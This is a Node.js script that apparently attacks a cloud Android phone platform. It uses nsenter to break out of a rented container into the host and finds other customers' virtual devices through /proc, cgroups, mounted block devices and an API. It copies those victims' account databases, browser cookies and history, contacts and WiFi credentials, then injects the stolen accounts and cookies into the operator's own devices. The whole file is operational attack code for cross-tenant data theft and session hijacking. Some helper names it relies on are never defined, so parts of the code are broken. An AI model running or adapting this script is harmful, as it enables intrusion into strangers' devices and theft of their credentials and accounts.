#!/usr/bin/env node
/**
 * GET NEIGHBOR V3 - MULTI-METHOD DISCOVERY + CLONE
 * =================================================
 * 
 * Tries multiple methods to find and clone neighbor devices:
 * 
 * METHOD A: Host /proc scan (nsenter container escape)
 * METHOD B: Device-mapper block device mounting  
 * METHOD C: Host cgroup enumeration
 * METHOD D: /sys/fs/cgroup container listing
 * METHOD E: padDetails API enumeration (info only)
 * 
 * Then extracts and clones to both target devices.
 */

const https = require('https');
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');

const { AK, SK, HOST, SVC, CT, SHD, sh } = require('../shared/vmos_api');
const TARGET_1 = 'ACP250923JS861KJ';
const TARGET_2 = 'ACP251008GUOEEHB';
const OUR = new Set([TARGET_1, TARGET_2]);

const SAVE_DIR = path.join(__dirname, '..', 'output', 'neighbor_v3_data');
const R = { ts: new Date().toISOString(), methods: {}, neighbors: [], extraction: {}, clone: {} };

function sign(bj){const xd=new Date().toISOString().replace(/[-:]/g,'').replace(/\.\d{3}Z$/,'Z');const sd=xd.slice(0,8);const xs=crypto.createHash('sha256').update(bj,'utf8').digest('hex');const can=[`host:${VMOS_HOST}`,`x-date:${xd}`,`content-type:${VMOS_CT}`,`signedHeaders:${VMOS_SH}`,`x-content-sha256:${xs}`].join('\n');const hc=crypto.createHash('sha256').update(can,'utf8').digest('hex');const sts=['HMAC-SHA256',xd,`${sd}/${VMOS_SERVICE}/request`,hc].join('\n');const kd=crypto.createHmac('sha256',Buffer.from(SK,'utf8')).update(sd).digest();const ks=crypto.createHmac('sha256',kd).update(VMOS_SERVICE).digest();const sk2=crypto.createHmac('sha256',ks).update('request').digest();const sig=crypto.createHmac('sha256',sk2).update(sts).digest('hex');return{'content-type':VMOS_CT,'x-date':xd,'x-host':VMOS_HOST,'authorization':`HMAC-SHA256 Credential=${AK}, SignedHeaders=${VMOS_SH}, Signature=${sig}`};}
function post(p,d,s){return new Promise((ok)=>{const b=JSON.stringify(d||{});const h=sign(b);const buf=Buffer.from(b,'utf8');const req=https.request({hostname:VMOS_HOST,path:p,method:'POST',headers:{...h,'content-length':buf.length},timeout:(s||30)*1000},res=>{let r='';res.on('data',c=>r+=c);res.on('end',()=>{try{ok(JSON.parse(r));}catch{ok({code:-1,raw:r.slice(0,300)});}});});req.on('timeout',()=>{req.destroy();ok({code:-99,msg:'timeout'});});req.on('error',e=>ok({code:-99,msg:e.message}));req.write(buf);req.end();});}
async function hostRun(cmd,sec){return run(TARGET_1,`nsenter -t 1 -m -u -i -n -p -- sh -c '${cmd.replace(/'/g,"'\"'\"'")}'`,sec||30);}

const log = m => console.log(`[${new Date().toISOString().slice(11,19)}] ${m}`);
const sleep = ms => new Promise(r => setTimeout(r, ms));
function ensureDir(d){if(!fs.existsSync(d))fs.mkdirSync(d,{recursive:true});return d;}
function save(f,d){fs.writeFileSync(path.join(SAVE_DIR,f),typeof d==='string'?d:JSON.stringify(d,null,2));}

// ═══════════════════════════════════════════════════════════════════════════
// METHOD A: Host /proc scanning for container PIDs
// ═══════════════════════════════════════════════════════════════════════════
async function methodA_procScan() {
  log('METHOD A: Host /proc scanning for container PIDs');
  
  // First enable root
  await post('/vcpcloud/api/padApi/switchRoot', { padCodes: [TARGET_1, TARGET_2], rootStatus: 1, rootType: 0 });
  
  // Comprehensive PID scan - look for various indicators
  const scanCmd = `
for pid in $(ls /proc/ 2>/dev/null | grep -E "^[0-9]+$" | sort -n | head -800); do
  # Check environ for pad_code
  env=$(cat /proc/$pid/environ 2>/dev/null | tr "\\0" " " | grep -o "pad_code=[A-Z0-9]*" 2>/dev/null)
  if [ -n "$env" ]; then
    comm=$(cat /proc/$pid/comm 2>/dev/null)
    cgroup=$(cat /proc/$pid/cgroup 2>/dev/null | head -1)
    echo "FOUND:$pid:$env:$comm:$cgroup"
  fi
done 2>/dev/null
`;
  
  const result = await hostRun(scanCmd, 60);
  R.methods.A_raw = result.out;
  
  const neighbors = [];
  const seen = new Set();
  
  for (const line of result.out.split('\n')) {
    const match = line.match(/FOUND:(\d+):pad_code=([A-Z0-9]+):([^:]*):(.*)$/);
    if (match) {
      const [, pid, padCode, comm, cgroup] = match;
      if (!OUR.has(padCode) && !seen.has(padCode)) {
        seen.add(padCode);
        neighbors.push({ pid, padCode, comm: comm.trim(), cgroup, method: 'A' });
        log(`  ✓ ${padCode} PID=${pid} (${comm.trim()})`);
      }
    }
  }
  
  R.methods.A_count = neighbors.length;
  return neighbors;
}

// ═══════════════════════════════════════════════════════════════════════════
// METHOD B: Device-mapper block device mounting
// ═══════════════════════════════════════════════════════════════════════════
async function methodB_deviceMapper() {
  log('METHOD B: Device-mapper block device scanning');
  
  // Find our dm devices
  const ourMounts = await run(TARGET_1, 'cat /proc/mounts | grep dm-', 10);
  const ourDmNums = new Set();
  for (const m of ourMounts.out.split('\n')) {
    const dm = m.match(/dm-(\d+)/);
    if (dm) ourDmNums.add(parseInt(dm[1]));
  }
  log(`  Our dm devices: ${[...ourDmNums].join(', ')}`);
  
  // List all dm devices on host
  const allDm = await hostRun('ls -la /dev/block/dm-* 2>/dev/null | head -20', 15);
  R.methods.B_all_dm = allDm.out;
  
  const neighbors = [];
  
  // Try to mount each dm device not ours
  for (let i = 0; i <= 10; i++) {
    if (ourDmNums.has(i)) continue;
    
    await run(TARGET_1, 'mkdir -p /data/local/tmp/dm_mount 2>/dev/null', 5);
    
    // Try ext4
    const mountResult = await hostRun(`mount -t ext4 -o ro /dev/block/dm-${i} /data/local/tmp/dm_mount 2>&1; echo "EXIT:$?"`, 15);
    
    if (mountResult.out.includes('EXIT:0')) {
      // Check for Android data structure
      const checkData = await hostRun('ls /data/local/tmp/dm_mount/data/data/ 2>/dev/null | head -3', 10);
      
      if (checkData.ok && checkData.out.length > 5) {
        log(`  ✓ dm-${i} has Android data: ${checkData.out.split('\n')[0]}`);
        
        // Try to find pad_code in properties
        const props = await hostRun('strings /data/local/tmp/dm_mount/data/property/persistent_properties 2>/dev/null | grep pad_code', 10);
        const padMatch = props.out.match(/pad_code[=\s]+([A-Z0-9]+)/);
        
        if (padMatch && !OUR.has(padMatch[1])) {
          neighbors.push({ dm: `dm-${i}`, padCode: padMatch[1], method: 'B' });
          log(`    Found pad_code: ${padMatch[1]}`);
        }
        
        R.methods[`B_dm${i}`] = { data: checkData.out, props: props.out };
      }
      
      await hostRun('umount /data/local/tmp/dm_mount 2>/dev/null', 10);
    }
    
    // Try f2fs
    const f2fsResult = await hostRun(`mount -t f2fs -o ro /dev/block/dm-${i} /data/local/tmp/dm_mount 2>&1; echo "EXIT:$?"`, 15);
    if (f2fsResult.out.includes('EXIT:0')) {
      const checkData = await hostRun('ls /data/local/tmp/dm_mount/ 2>/dev/null | head -5', 10);
      log(`  dm-${i} f2fs: ${checkData.out.split('\n').slice(0, 2).join(', ')}`);
      await hostRun('umount /data/local/tmp/dm_mount 2>/dev/null', 10);
    }
    
    await sleep(200);
  }
  
  R.methods.B_count = neighbors.length;
  return neighbors;
}

// ═══════════════════════════════════════════════════════════════════════════
// METHOD C: Host cgroup enumeration
// ═══════════════════════════════════════════════════════════════════════════
async function methodC_cgroups() {
  log('METHOD C: Host cgroup enumeration');
  
  // List all cgroup controllers and find container cgroups
  const cgroupScan = await hostRun(`
find /sys/fs/cgroup -maxdepth 4 -type d -name "*pad*" 2>/dev/null | head -30
find /sys/fs/cgroup -maxdepth 4 -type d -name "*ACP*" 2>/dev/null | head -30
cat /sys/fs/cgroup/cpu/tasks 2>/dev/null | head -50
`, 30);
  
  R.methods.C_raw = cgroupScan.out;
  
  const neighbors = [];
  const padPattern = /[A-Z]{3}\d{6}[A-Z0-9]{8}/g;
  const matches = cgroupScan.out.match(padPattern) || [];
  
  for (const pad of new Set(matches)) {
    if (!OUR.has(pad)) {
      neighbors.push({ padCode: pad, method: 'C' });
      log(`  ✓ Cgroup pad: ${pad}`);
    }
  }
  
  R.methods.C_count = neighbors.length;
  return neighbors;
}

// ═══════════════════════════════════════════════════════════════════════════
// METHOD D: /proc/1/mountinfo analysis
// ═══════════════════════════════════════════════════════════════════════════
async function methodD_mountinfo() {
  log('METHOD D: Host mountinfo analysis');
  
  const mountinfo = await hostRun('cat /proc/1/mountinfo 2>/dev/null | grep -E "(overlay|dm-)" | head -30', 20);
  R.methods.D_raw = mountinfo.out;
  
  // Look for overlay mounts that might be other containers
  const overlayMounts = mountinfo.out.split('\n').filter(l => l.includes('overlay'));
  log(`  Overlay mounts: ${overlayMounts.length}`);
  
  for (const line of overlayMounts.slice(0, 5)) {
    log(`    ${line.slice(0, 100)}`);
  }
  
  return [];
}

// ═══════════════════════════════════════════════════════════════════════════
// METHOD E: padDetails API enumeration
// ═══════════════════════════════════════════════════════════════════════════
async function methodE_apiEnum() {
  log('METHOD E: padDetails API enumeration');
  
  let lastId = 0;
  const neighbors = [];
  
  for (let page = 0; page < 5; page++) {
    const body = lastId > 0 ? { lastId, size: 50 } : { size: 50 };
    const r = await post('/vcpcloud/api/padApi/padDetails', body);
    
    if (r.code !== 200 || !r.data?.pageData?.length) break;
    
    for (const dev of r.data.pageData) {
      if (!OUR.has(dev.padCode)) {
        neighbors.push({
          padCode: dev.padCode,
          ip: dev.padIp,
          online: dev.online,
          model: dev.model,
          method: 'E'
        });
      }
    }
    
    lastId = r.data.lastId;
    if (!r.data.hasNext) break;
    await sleep(300);
  }
  
  log(`  API neighbors: ${neighbors.length} (online: ${neighbors.filter(n => n.online === 1).length})`);
  R.methods.E_count = neighbors.length;
  R.methods.E_neighbors = neighbors.slice(0, 20);
  
  return neighbors;
}

// ═══════════════════════════════════════════════════════════════════════════
// EXTRACTION from neighbor via /proc/PID/root
// ═══════════════════════════════════════════════════════════════════════════
async function extractFromNeighbor(neighbor) {
  if (!neighbor.pid) {
    log(`  Cannot extract - no PID for ${neighbor.padCode}`);
    return null;
  }
  
  log(`Extracting from ${neighbor.padCode} (PID ${neighbor.pid})...`);
  
  const root = `/proc/${neighbor.pid}/root`;
  const extraction = {};
  const nbDir = ensureDir(path.join(SAVE_DIR, neighbor.padCode));

  // Identity
  const identity = await hostRun(`cat ${root}/system/build.prop 2>/dev/null | head -40`, 30);
  extraction.identity = identity.out;
  save(`${neighbor.padCode}/build.prop`, identity.out);
  
  // Persistent properties
  const props = await hostRun(`strings ${root}/data/property/persistent_properties 2>/dev/null | head -60`, 30);
  extraction.props = props.out;
  save(`${neighbor.padCode}/persist_props.txt`, props.out);
  
  // Accounts DB
  const accounts = await hostRun(`base64 ${root}/data/system_ce/0/accounts_ce.db 2>/dev/null`, 60);
  if (accounts.ok && accounts.out.length > 100 && !accounts.out.startsWith('[')) {
    extraction.accounts_ce = accounts.out;
    save(`${neighbor.padCode}/accounts_ce.db.b64`, accounts.out);
    log(`  ✓ accounts_ce.db: ${accounts.out.length} b64`);
  }
  
  // Chrome
  const chromeCookies = await hostRun(`base64 ${root}/data/data/com.android.chrome/app_chrome/Default/Cookies 2>/dev/null`, 60);
  if (chromeCookies.ok && chromeCookies.out.length > 100) {
    extraction.chrome_cookies = chromeCookies.out;
    save(`${neighbor.padCode}/chrome_cookies.b64`, chromeCookies.out);
    log(`  ✓ Chrome Cookies: ${chromeCookies.out.length} b64`);
  }
  
  const chromeHistory = await hostRun(`base64 ${root}/data/data/com.android.chrome/app_chrome/Default/History 2>/dev/null`, 60);
  if (chromeHistory.ok && chromeHistory.out.length > 100) {
    extraction.chrome_history = chromeHistory.out;
    save(`${neighbor.padCode}/chrome_history.b64`, chromeHistory.out);
    log(`  ✓ Chrome History: ${chromeHistory.out.length} b64`);
  }
  
  // Contacts
  const contacts = await hostRun(`base64 ${root}/data/data/com.android.providers.contacts/databases/contacts2.db 2>/dev/null`, 60);
  if (contacts.ok && contacts.out.length > 100) {
    extraction.contacts = contacts.out;
    save(`${neighbor.padCode}/contacts2.db.b64`, contacts.out);
    log(`  ✓ Contacts: ${contacts.out.length} b64`);
  }
  
  // WiFi
  const wifi = await hostRun(`cat ${root}/data/misc/wifi/WifiConfigStore.xml 2>/dev/null`, 30);
  if (wifi.ok && wifi.out.length > 50) {
    extraction.wifi = wifi.out;
    save(`${neighbor.padCode}/WifiConfigStore.xml`, wifi.out);
    log(`  ✓ WiFi: ${wifi.out.length} chars`);
  }
  
  R.extraction = extraction;
  return extraction;
}

// ═══════════════════════════════════════════════════════════════════════════
// CLONE to target device
// ═══════════════════════════════════════════════════════════════════════════
async function cloneToDevice(target, neighbor, extraction) {
  log(`Cloning to ${target}...`);
  
  const result = { success: [], failed: [] };
  const srcDir = path.join(SAVE_DIR, neighbor.padCode);
  
  // Inject accounts
  const accountsFile = path.join(srcDir, 'accounts_ce.db.b64');
  if (fs.existsSync(accountsFile)) {
    const b64 = fs.readFileSync(accountsFile, 'utf8').trim();
    if (b64.length < 50000) {
      const cmd = `echo '${b64}' | base64 -d > /data/system_ce/0/accounts_ce.db 2>/dev/null && chmod 600 /data/system_ce/0/accounts_ce.db && echo OK`;
      const r = await run(target, cmd, 45);
      if (r.ok && r.out.includes('OK')) {
        result.success.push('accounts_ce.db');
        log(`  ✓ accounts_ce.db`);
      } else {
        result.failed.push('accounts_ce.db');
      }
    }
  }
  
  // Inject Chrome cookies
  const cookiesFile = path.join(srcDir, 'chrome_cookies.b64');
  if (fs.existsSync(cookiesFile)) {
    const b64 = fs.readFileSync(cookiesFile, 'utf8').trim();
    if (b64.length < 50000) {
      const cmd = `echo '${b64}' | base64 -d > /data/data/com.android.chrome/app_chrome/Default/Cookies 2>/dev/null && echo OK`;
      const r = await run(target, cmd, 45);
      if (r.ok && r.out.includes('OK')) {
        result.success.push('chrome_cookies');
        log(`  ✓ chrome_cookies`);
      }
    }
  }
  
  // Inject properties from build.prop
  if (extraction.identity) {
    const keyProps = ['ro.product.model', 'ro.product.brand', 'ro.build.fingerprint'];
    for (const line of extraction.identity.split('\n')) {
      for (const key of keyProps) {
        if (line.startsWith(key + '=')) {
          const val = line.split('=')[1];
          const r = await run(target, `setprop "${key}" "${val}"`, 10);
          if (r.ok) result.success.push(`setprop:${key}`);
        }
      }
    }
    log(`  ✓ Properties set`);
  }
  
  R.clone[target] = result;
  return result;
}

// ═══════════════════════════════════════════════════════════════════════════
// MAIN
// ═══════════════════════════════════════════════════════════════════════════
async function main() {
  console.log('═'.repeat(70));
  console.log('  GET NEIGHBOR V3 - MULTI-METHOD DISCOVERY + CLONE');
  console.log('═'.repeat(70));
  
  ensureDir(SAVE_DIR);
  
  // Try all discovery methods
  let allNeighbors = [];
  
  // Method A: /proc scan (best method)
  const neighborsA = await methodA_procScan();
  allNeighbors = allNeighbors.concat(neighborsA);
  
  // Method B: device-mapper (fallback)
  if (neighborsA.length === 0) {
    const neighborsB = await methodB_deviceMapper();
    allNeighbors = allNeighbors.concat(neighborsB);
  }
  
  // Method C: cgroups
  const neighborsC = await methodC_cgroups();
  allNeighbors = allNeighbors.concat(neighborsC);
  
  // Method D: mountinfo
  await methodD_mountinfo();
  
  // Method E: API enumeration (always run for info)
  const neighborsE = await methodE_apiEnum();
  
  // Dedupe neighbors
  const seenPads = new Set();
  const uniqueNeighbors = [];
  for (const n of allNeighbors) {
    if (!seenPads.has(n.padCode)) {
      seenPads.add(n.padCode);
      uniqueNeighbors.push(n);
    }
  }
  
  R.neighbors = uniqueNeighbors;
  log(`\nTotal unique neighbors with PID access: ${uniqueNeighbors.length}`);
  
  // If we found neighbors with PID access, extract and clone
  const withPid = uniqueNeighbors.filter(n => n.pid);
  
  if (withPid.length > 0) {
    const target = withPid[0];
    log(`\nSelected target: ${target.padCode} (PID ${target.pid})`);
    
    // Extract
    const extraction = await extractFromNeighbor(target);
    
    if (extraction && Object.keys(extraction).length > 2) {
      // Clone to both devices
      console.log('\n▶ CLONING TO BOTH DEVICES');
      await cloneToDevice(TARGET_1, target, extraction);
      await cloneToDevice(TARGET_2, target, extraction);
    }
  } else {
    log('\nNo neighbors with /proc access found');
    log(`API enumeration found ${neighborsE.length} neighbors (cannot execute on them)`);
  }
  
  // Save report
  const reportFile = path.join(SAVE_DIR, `REPORT_${Date.now()}.json`);
  fs.writeFileSync(reportFile, JSON.stringify(R, null, 2));
  
  // Summary
  console.log('\n' + '═'.repeat(70));
  console.log('  RESULTS');
  console.log('═'.repeat(70));
  console.log(`  Method A (/proc): ${R.methods.A_count || 0} neighbors`);
  console.log(`  Method B (dm): ${R.methods.B_count || 0} neighbors`);
  console.log(`  Method C (cgroup): ${R.methods.C_count || 0} neighbors`);
  console.log(`  Method E (API): ${R.methods.E_count || 0} neighbors`);
  console.log(`  Total with PID: ${withPid.length}`);
  if (R.clone[TARGET_1]) console.log(`  Clone ${TARGET_1}: ${R.clone[TARGET_1].success.length} success`);
  if (R.clone[TARGET_2]) console.log(`  Clone ${TARGET_2}: ${R.clone[TARGET_2].success.length} success`);
  console.log(`  Report: ${reportFile}`);
  console.log('═'.repeat(70));
}

main().catch(e => { console.error('FATAL:', e); process.exit(1); });
